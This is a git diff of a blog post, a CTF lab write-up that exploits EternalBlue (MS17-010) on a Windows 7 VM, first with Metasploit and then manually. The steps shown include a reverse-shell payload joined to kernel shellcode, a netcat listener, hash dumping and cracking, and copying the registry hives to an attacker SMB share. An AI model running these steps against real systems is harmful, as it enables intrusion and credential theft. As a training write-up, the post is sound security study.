@@ -8,16 +8,16 @@ type: "post"
 draft: false
 ---
 
-### Introduction:
+## Introduction:
 After participating in the Disney Can-You-Hack-It CTF, I've been trying to spend more of my time studying security and offensive penetration testing. Primarily, I've been trying to balance both understanding how to effectively perform an attack with the awesome frameworks out their like metasploit, but also gain a better understanding of what this framework is doing under the hood. This post is meant to be the first of many as I attempt to practice documenting both the attack and my methodology.
 
-### Environment
-Both attacks are taking place in a fairly flat network consisting of my attack host, a fresh booted livecd of Kali Linux, and the the target host, a freshly booted Windows VM that I knew contained 3 flags to capture.. No other information is known about the host, what it's running or it's OS versioning, however I would be lying if I said I didn't assume that this would be an eternalblue attack based off the name.
+## Environment
+Both attacks take place in a flat network consisting of my attack host, a freshly-booted Kali Linux livecd, and the the target host, a freshly booted Windows VM that I knew contained 3 flags to capture. No other information is known about the host, what it's running or it's OS versioning, however I would be lying if I said I didn't assume that this would be an eternalblue attack based off the name.
 
-### Attacking Blue with Metasploit
-I started the attack by opening a tmux session and starting meterpreter with `msfdb run` to spin up a postgres instance to persist scans and recon data and promptly kicked off an nmap scan.
+## Attacking Blue with Metasploit
+I started the attack by opening a tmux session and starting meterpreter with `msfdb run` to spin up a postgres instance for persisting scans and recon data.
 
-#### Host enumeration
+### Host enumeration
 Given that I was investigating a single host, and that I had an unfair suspicion of what kind of attack vector I would be looking for, I started with a default script and service version scan.
 
 ```
@@ -61,9 +61,9 @@ msf5 > db_nmap -sV -sC -Pn 10.10.201.83
 [*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 140.63 seconds
 ```
 
-This initial scan tends to confirm my beliefs that this is an eternalblue attack as it looks like the host is Windows 7 Service Pack 1 machine with listening SMB. In addition, this ended up leaking a name as the computer's name, which is worth keeping in mind as a potential administrative user going forward. Additionally this points out relaxed security setting in the smb services configuration.
+This initial scan tended to provide further evidence toward my beliefs that this was an eternalblue attack as it looked like the host was a Windows 7 Service Pack 1 machine with SMB available. In addition, this ended up leaking a potential username as the computer's name, which was worth keeping in mind as a potential administrative user going forward. Additionally this pointed out relaxed security setting in the smb service's configuration.
 
-Give what I knew so far i decided to probe a little further into SMB with a enumartion of smb using nmap's `smb-enum-shares` and `smb-enum-user` scripts.
+Give what I knew so far I decided to probe a little further into SMB with an enumaration using nmap's `smb-enum-shares` scripts.
 
 ```
 msf5 > db_nmap --script smb-enum-shares  -p 445 10.10.201.83
@@ -88,7 +88,7 @@ msf5 > db_nmap --script smb-enum-shares  -p 445 10.10.201.83
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
 ```
 
-Again this points to anonymous access on the IPC share, another pointer towards eternalblue being the vector. With this information, I decided I should kick off a quick vuln scan via NMA to see if it does infact identify eternalblue. Which it quickly did, as ms17-010.
+Again this pointed to anonymous read access on the IPC share, another pointer towards eternalblue being the vector. With this information, I decided I should kick off a quick vuln scan with `nmap` to see if it would infact identify eternalblue. Which it quickly did, as `ms17-010`.
 
 ```
 msf5 > db_nmap --script vuln  -p 445 10.10.201.83
@@ -120,7 +120,7 @@ msf5 > db_nmap --script vuln  -p 445 10.10.201.83
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 15.51 seconds
 ```
 
-Given that I had a potential attack I decided to do a quick recap of the services on the host to make sure I didn't miss anything and saw that I'd overlooked RDP listening as well. I decided to keep this in mind for later in case 
+Given that I had a potential attack I decided to do a quick recap of the services on the host to make sure I didn't miss anything and saw that I'd overlooked RDP listening, which ended up being useful later in the attack.
 
 ```
 msf5 > services 
@@ -140,8 +140,8 @@ host          port   proto  name           state  info
 10.10.201.83  49160  tcp    unknown        open   Microsoft Windows RPC
 ```
 
-#### Preparing an attack
-I decided to plan for an attempt at eternal blue by first searching for the exploit id `ms17-010`
+### Preparing an attack
+First step was seeing if there was any exploit available for `ms17-010`
 
 ```
 msf5 > search ms17-010
@@ -162,7 +162,7 @@ Matching Modules
 Interact with a module by name or index, for example use 5 or use exploit/windows/smb/smb_doublepulsar_rce
 ```
 
-Since it's a windows 7 host that's being attacked the second option in the list seems like a perfect candidate. 
+Since it's a windows 7 host that's being attacked the second option in the list seemed like a perfect candidate. 
 
 ```
 msf5 > use 2
@@ -245,10 +245,10 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-SUCCESS! And it left me with System credentials. At this point the machine was mine, but I decided to make sure I had a stable foothold on the machine before proceeding with searching for the flags.
+SUCCESS! And it left me with `NT AUTHORITY\SYSTEM` credentials. At this point the machine was mine, but I decided to make sure I had a stable foothold on the machine before proceeding with searching for the flags.
 
-#### Foothold
-First step was making sure my shell on the host was stable. So I checked my pid and looked to see if I could migrate it to something like the print spool. 
+### Foothold
+The first step was making sure my shell on the host was stable. So I checked my pid and looked to see if I could migrate it to something like the print spooler. 
 
 ```
 meterpreter > getpid 
@@ -279,15 +279,15 @@ Process List
  2548  708   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
  2956  708   vds.exe               x64   0        NT AUTHORITY\SYSTEM           
  2996  708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
- ```
+```
 
- Luckily for me it already looks like it's in the spool service so there was no need to proceed with a further migration.
+Luckily for me it already looked like it was in the injected in the spool service so there was no need to proceed with a migration.
 
- While I already knew where this host was running from deploying it, this `ps` output also reiterated that this host was on EC2 via the ssm-agent, LiteAgent and Ec2Config processes. This was also made apparent in the enumeration stages via reverse dns lookups this is just further evidence in case the earlier point was missed.
+While I already knew where this host was running from deploying it, this `ps` output also reiterated that this host was an EC2 instance via the `ssm-agent`, `LiteAgent` and `Ec2Config` processes. While this could also be seen in the nmap scans via the reverse dns lookup, I thought it was still worth calling out.
 
- A point that can be confirmed once again with a quick run of the `post/windows/gather/checkvm` module.
+This point was again reiterated a quick run of the `post/windows/gather/checkvm` module.
 
- ```
+```
 meterpreter > run post/windows/gather/checkvm 
 
 [*] Checking if JON-PC is a Virtual Machine ...
@@ -316,7 +316,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 ```
 
-And of course, the there is Jon. With our hashes and users, I dumped these credentials into a file and ran `john` against it with Kali's copy of the `rockyou.txt` password list.
+And of course, there is Jon. With our hashes and users, I dumped these credentials into a file and ran `john` against it with Kali's copy of the `rockyou.txt` password list.
 
 ```bash
 root@kali:~/ctf/blue# john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
@@ -346,19 +346,19 @@ meterpreter > run post/windows/manage/enable_rdp
 [*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20201111022704_default_10.10.201.83_host.windows.cle_997445.txt
 ```
 
-#### Wrapping up
+### Wrapping up
 With a new shell I was able to find each of the 3 flags in fairly standard locations on the C:\ drive.
 
 - C:\flag1.txt flag{access_the_machine}
 - C:\Windows\system32\config\flag2.txt flag{sam_database_elevated_access}
 - C:\Users\Jon\Documents\flag3.txt flag{admin_documents_can_be_valuable}
 
-### Attacking Blue without Metasploit
-With the initial attack out of the way I decided to attempt the attack without the help of metasploit for directly for sourcing, packing and executing the exploit. This also imposes the restriction that I won't have access to meterpreter and all the benefits that adds for gaining a foothold.
+## Attacking Blue without Metasploit
+Now that the initial attack out of the way I decided to attempt the attack without the help of metasploit for sourcing, packing and executing the exploit. This also imposed the restriction of not having the meterpreter shell to rely on.
 
-While I understood the attack and the host at this point I still decided to still run through the motions of host enumeration. For the sake of brevity, I will not repeat some of the callouts of the findings unless there are differences from the first attack.
+While I understood the attack and the host at this point I decided to still run through the motions of host enumeration. For the sake of brevity, I will not repeat some of the callouts of the findings unless there are differences from the first attack.
 
-I started with an nmap scan with the only difference being that I now supplied `-oA $ATTACKTARGET` to write scan logs to the host with the target servers ip as a prefix. This was to make up for the limitation of not having the results automatically persisted in `msfdb`.
+I started with the same nmap scan with the only difference being that I now supplied `-oA $ATTACKTARGET` to output the results to the host with the target servers ip as a prefix. This was to make up for the limitation of not having the results automatically persisted in `msfdb`.
 
 ```
 root@kali:~/ctf/scans# export ATTACKTARGET=10.10.87.38
@@ -494,7 +494,7 @@ userland_start_thread:
 userland_payload:
 ```
 
-With all this in mind, I then pulled down the python exploit script and shellcode and assembled the latter with nasm as a flat binary; then I generated an unstaged tcp reverse shell for windows as a payload, also a flat binary and joined the contents contents into a single `sc_joined.bin` payload. One pointless thing to note is I added an arbitrary nop sled to the payload. This could have been left out.
+With all this in mind, I then pulled down the python exploit script and shellcode and assembled the latter with nasm as a flat binary. Then I generated an unstaged tcp reverse shell for windows as a payload, also a flat binary, and joined the contents contents into a single `sc_joined.bin` payload. One pointless thing to note is I added an arbitrary nop sled to the payload. This could have been left out.
 
 ```bash
 root@kali:~/ctf/scans# cd ../
@@ -512,7 +512,7 @@ root@kali:~/ctf/exploits# cat sc_x64_kernel.bin reverse.bin > sc_joined.bin
 ```
 
 #### Attacking
-To prepare to catch the reverse shell generated by the I stared a netcat listener on port 443 in a new terminal before returning to the original to install the single required python dependency `impacket` and kick off the attack.
+To prepare to catch the reverse shell, I started a netcat listener on port 443 in a new terminal before returning to the original to install the single required python dependency `impacket` and kick off the attack.
 
 ```bash
 root@kali:~# nc -lvnp 443
@@ -545,7 +545,7 @@ C:\Windows\system32>
 ```
 
 ### Foothold
-Unlike the first attack I knew this windows shell was extremely limited, and my first priority was to try to egress credentials so that I could escalate to a more stable access point.
+Unlike the first attack I knew this windows shell was extremely limited, and my first priority was to try to egress credentials so that I could escalate to a more stable point of access.
 
 ```
 C:\Windows\system32>net user
@@ -598,9 +598,9 @@ flag{access_the_machine}
 C:\>
 ```
 
-The first step was identifying the local users and attempting to dump some crucial registers that I could attack offline. While doing this I happened to dump these registry hives in at the root of the `C:\`. In hindsight this was probably a poor choice of location as it would be much more likely to be caught here than in other locations. However in doing so I happened to spot the first flag `flag{access_the_machine}`.
+The first step was identifying the local users and attempting to dump some crucial registers that I could attack offline. While doing this I happened to dump these registry hives to the root of the `C:\` drive which happened to point out the first flag `flag{access_the_machine}`. In hindsight this was probably a poor choice of location as it would be much more likely to be caught here than in other locations.
 
-However now that I had the hives dumped on disk I still needed to figure out how to egress them to my local machine to attack. This lead me to reference an example from [ropnop's blog](https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb) and I decided to turn up an instance of the impacket-smbserver that comes preinstalled on Kali.
+Now that I had the hives dumped on disk I still needed to figure out how to egress them to my local machine for further attack. This lead me to reference an example from [ropnop's blog](https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb) pointing me towards the impacket-smbserver that comes preinstalled on Kali as I could interact with SMB from the cmd shell with out the need to install any further tools or have an interactive shell.
 
 ```bash
 root@kali:~/# mkdir -p ctf/extractor && cd ctf/extractor
@@ -619,7 +619,7 @@ root@kali:~# netstat -plunt | grep 445
 tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      1428/python3
 ```
 
-From the target host I was now able to validate that I could see and connect to the newly started share and promptly copied the hives over.
+From the target host I was now able to validate that I could see and connect to the newly started share and promptly copied the hives back to my attack machine.
 
 ```
 C:\>net view \\10.10.47.175
@@ -648,7 +648,7 @@ copy C:\system.save \\10.10.47.175\BLUE\system.save
         1 file(s) copied.
 ```
 
-With these credentials now available locally, I could extract the user hashes and perform the same attack with `john` that I performed before.
+With these credentials now available locally, I could extract the user hashes using `secretsdump` from impacket and perform the same attack with `john` that I had performed before.
 
 ```bash
 root@kali:~/ctf/extractor# impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
